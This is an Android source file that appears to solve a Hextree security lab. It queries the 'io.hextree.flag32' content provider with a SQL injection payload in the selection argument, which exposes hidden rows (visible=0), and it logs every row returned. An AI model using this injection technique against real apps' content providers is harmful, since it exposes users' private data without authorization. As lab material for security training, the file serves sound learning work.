package niraj.patali.contentproviderusage;

import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Cursor cursor = null;
        try {
            // Query the content provider with the adjusted injection payload
            cursor = getContentResolver().query(
                    Uri.parse("content://io.hextree.flag32/flags"),
                    null,            // Select all columns
                    "1=1) or visible=0 and (1=1",     // Selection criteria
                    null,            // No selection arguments
                    null             // No sort order
            );
            // Process and log the query results
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    StringBuilder rowData = new StringBuilder();
                    for (int i = 0; i < cursor.getColumnCount(); i++) {
                        if (i > 0) {
                            rowData.append(", ");
                        }
                        rowData.append(cursor.getColumnName(i))
                                .append(" = ")
                                .append(cursor.getString(i));
                    }
                    Log.d("DatabaseDump", rowData.toString());
                } while (cursor.moveToNext());
            } else {
                Log.w("DatabaseDump", "No data returned from the query.");
            }
        } catch (Exception e) {
            Log.e("DatabaseDumpError", "Error executing SQL injection", e);
        } finally {
            // Close the cursor to release resources
            if (cursor != null) {
                cursor.close();
            }
        }
    }
}
